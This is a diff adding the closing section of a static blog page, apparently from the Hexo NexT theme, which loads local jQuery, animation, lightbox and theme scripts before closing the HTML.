+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
